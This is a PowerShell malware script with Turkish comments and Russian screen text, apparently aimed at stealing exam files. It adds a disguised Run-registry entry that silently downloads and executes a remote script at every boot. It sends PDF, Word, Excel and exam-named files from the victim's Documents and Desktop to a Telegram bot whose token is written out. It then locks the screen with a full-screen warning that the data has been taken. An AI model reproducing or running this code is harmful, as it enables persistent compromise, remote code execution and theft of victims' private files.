# --- AYARLAR ---
$botToken = "7963651435:AAEwnINCDTKPfNi4nTns-7pykoSaBWIC05M"
$chatId = "7036117225"
$deepPath = "C:\Program Files (x86)\Common Files\Microsoft Shared\fsociety is always here\we are fsociety\fuck society"
$logoUrl = "https://raw.githubusercontent.com/KULLANICI_ADIN/REPO/main/logo.png" # Kendi linkinle değiştir

# --- 1. ADIM: REPO COPY & KALICILIK (PERSISTENCE) ---
# Bilgisayar her açıldığında kendini GitHub'dan günceller
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$payload = "powershell -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/KULLANICI_ADIN/REPO/main/master.ps1')"
Set-ItemProperty -Path $runKey -Name "SystemSecurityUpdate" -Value $payload

# --- 2. ADIM: KLASÖR YAPILANDIRMA & İMZA ---
if (!(Test-Path $deepPath)) { New-Item -Path $deepPath -ItemType Directory -Force }
try { Invoke-WebRequest -Uri $logoUrl -OutFile "$deepPath\logo.png" } catch {}

# --- 3. ADIM: LOOT (SINAV DOSYALARINI SIZDIRMA) ---
$msg = "🇷🇺 [ОБЪЕКТ ПОДКЛЮЧЕН]: $($env:COMPUTERNAME) - Veri sızdırma başladı..."
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$msg}

$formats = @("*.pdf*", "*.docx*", "*.xlsx*", "*sinav*", "*soru*")
Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $formats -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId"
        Invoke-RestMethod -Uri $uri -Method Post -Form @{document=Get-Item $_.FullName}
    } catch {}
}

# --- 4. ADIM: RUSÇA KİLİT EKRANI (LOCK) ---
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = "Manual"
$form.Location = New-Object System.Drawing.Point(0,0)
$form.Size = New-Object System.Drawing.Size([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$form.FormBorderStyle = "None"
$form.BackColor = "Black"
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "ВНИМАНИЕ! СИСТЕМА ЗАБЛОКИРОВАНА`n`nВАШИ ДАННЫЕ ПРИНАДЛЕЖАТ НАМ`n`nЭКЗАМЕНЫ ОТМЕНЕНЫ - BADBOY52"
$label.Font = New-Object System.Drawing.Font("Consolas", 30, [System.Drawing.FontStyle]::Bold)
$label.ForeColor = "Red"
$label.TextAlign = "MiddleCenter"
$label.Dock = "Fill"
$form.Controls.Add($label)

# Fareyi ve klavyeyi odakla, sistemi kilitle
$form.ShowDialog()
